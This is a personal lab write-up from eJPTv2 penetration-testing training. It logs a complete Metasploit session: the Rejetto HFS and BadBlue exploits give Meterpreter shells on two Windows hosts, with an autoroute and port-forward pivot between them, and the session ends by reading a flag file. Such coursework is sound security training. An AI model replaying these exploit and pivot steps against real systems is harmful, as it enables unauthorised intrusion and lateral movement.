---
up: "[[Windows Post Exploitation]]"
link: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/The Metasploit Framework/Windows Post Exploitation/Pivoting]]"
---

# ðŸ§ª Pivoting

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit both the machines using the appropriate Metasploit module.

Victim Machine 1 : 10.4.18.100

Victim Machine 2 : 10.4.22.144

Shorted commands:

```bash
$ sudo service postgresql start && msfconsole
> workspace -a lab_piv
> db_nmap -sV 10.4.18.100
> use exploit/windows/http/rejetto_hfs_exec
> set RHOSTS 10.4.18.100
> run
m> 
```

Full logs:

```bash
$ sudo service postgresql start && msfconsole
msf6 > workspace -a lab_piv
[*] Added workspace: lab_piv
[*] Workspace: lab_piv
msf6 > db_nmap -sV 10.4.22.215
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-02 04:17 IST
[*] Nmap: Nmap scan report for 10.4.22.215
[*] Nmap: Host is up (0.0095s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.53 seconds
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.4.22.215
RHOSTS => 10.4.22.215
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.23.2:4444 
[*] Using URL: http://0.0.0.0:8080/lAjMpoC
[*] Local IP: http://10.10.23.2:8080/lAjMpoC
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /lAjMpoC
[*] Sending stage (175174 bytes) to 10.4.22.215
[!] Tried to delete %TEMP%\XSYzhwlqg.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.23.2:4444 -> 10.4.22.215:49242) at 2024-03-02 04:19:44 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 14
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a04:16d7
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 21
============
Name         : Amazon Elastic Network Adapter
Hardware MAC : 0e:da:74:d8:39:f1
MTU          : 1500
IPv4 Address : 10.4.22.215
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::a8d2:b46d:b923:488b
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > run autoroute -s 10.4.22.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.4.22.0/255.255.240.0...
[+] Added route to 10.4.22.0/255.255.240.0 via 10.4.22.215
[*] Use the -p option to list all active routes
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y
msf6 exploit(windows/http/rejetto_hfs_exec) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
PORTS => 1-1000
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.4.31.62
RHOSTS => 10.4.31.62
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.4.31.62:           - 10.4.31.62:80 - TCP OPEN
[+] 10.4.31.62:           - 10.4.31.62:135 - TCP OPEN
[+] 10.4.31.62:           - 10.4.31.62:139 - TCP OPEN
[+] 10.4.31.62:           - 10.4.31.62:445 - TCP OPEN
[*] 10.4.31.62:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/portscan/tcp) > sessions 1
[*] Starting interaction with 1...

meterpreter > portfwd add -l 4433 -p 80 -r 10.4.31.62
[*] Local TCP relay created: :4433 <-> 10.4.31.62:80
meterpreter > 
Background session 1? [y/N]  
msf6 auxiliary(scanner/portscan/tcp) > db_nmap -sS -sV -p 4433 localhost
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-02 04:28 IST
[*] Nmap: Nmap scan report for localhost (127.0.0.1)
[*] Nmap: Host is up (0.000041s latency).
[*] Nmap: Other addresses for localhost (not scanned): ::1
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 4433/tcp open  http    BadBlue httpd 2.7
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 34.57 seconds
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/http/badblue_passthru
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > set RPORT 80
RPORT => 80
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.4.31.62
RHOSTS => 10.4.31.62
msf6 exploit(windows/http/badblue_passthru) > run

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.4.31.62:4444
[*] Sending stage (175174 bytes) to 10.4.31.62
[*] Meterpreter session 2 opened (10.4.22.215:50371 -> 10.4.31.62:4444) at 2024-03-02 04:43:09 +0530

meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > dir
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2018-09-15 12:49:00 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2018-11-14 12:26:16 +0530  BOOTNXT
40777/rwxrwxrwx   8192    dir   2018-11-14 12:26:15 +0530  Boot
40777/rwxrwxrwx   0       dir   2018-11-14 21:40:15 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2018-11-14 12:26:17 +0530  EFI
40777/rwxrwxrwx   0       dir   2018-09-15 12:49:00 +0530  PerfLogs
40555/r-xr-xr-x   4096    dir   2018-09-15 12:49:00 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2018-09-15 12:49:00 +0530  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2018-09-15 12:49:00 +0530  ProgramData
40777/rwxrwxrwx   0       dir   2018-11-15 05:37:05 +0530  Recovery
40777/rwxrwxrwx   4096    dir   2020-11-07 06:12:12 +0530  System Volume Information
40555/r-xr-xr-x   4096    dir   2018-09-15 11:39:26 +0530  Users
40777/rwxrwxrwx   16384   dir   2018-09-15 11:39:26 +0530  Windows
100444/r--r--r--  408692  fil   2018-11-14 12:26:16 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2021-04-07 13:33:04 +0530  flag.txt
0000/---------    0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt
c46d12f28d87ae0b92b05ebd9fb8e817meterpreter > 
```
